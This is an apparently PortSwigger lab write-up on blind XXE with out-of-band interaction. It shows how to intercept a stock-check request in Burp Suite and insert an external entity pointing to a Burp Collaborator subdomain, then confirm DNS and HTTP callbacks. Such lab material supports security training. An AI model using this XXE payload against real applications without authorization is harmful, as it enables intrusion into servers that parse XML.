## Lab Description: Blind XXE with out-of-band interaction

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/fd769977-c55e-4fe1-8af9-658445a282fc)

## Solution: 

Visit a product page, click "Check stock" and intercept the resulting POST request in Burp Suite Professional.

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/f666aea3-8ad8-43d0-9956-469633888dfc)

Insert the following external entity definition in between the XML declaration and the stockCheck element. Right-click and select "Insert Collaborator payload" to insert a Burp Collaborator subdomain where indicated:
```
<!DOCTYPE stockCheck [<!ENTITY xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> ]>
```

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/ee28e96e-1846-47d8-9143-924f21f3f24b)

It will show "Invalid Product ID"

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/56c0ffa9-55d6-4e65-b31b-4cb8a14a295c)

Go to the Collaborator tab, and click "Poll now". If you don't see any interactions listed, wait a few seconds and try again. You should see some DNS and HTTP interactions that were initiated by the application as the result in our payload.

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/32a85192-6fa1-4d07-b8b2-9497106607f4)

Lab Solved

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/3dcdc4d5-39bc-40f5-80bb-9492d146582f)

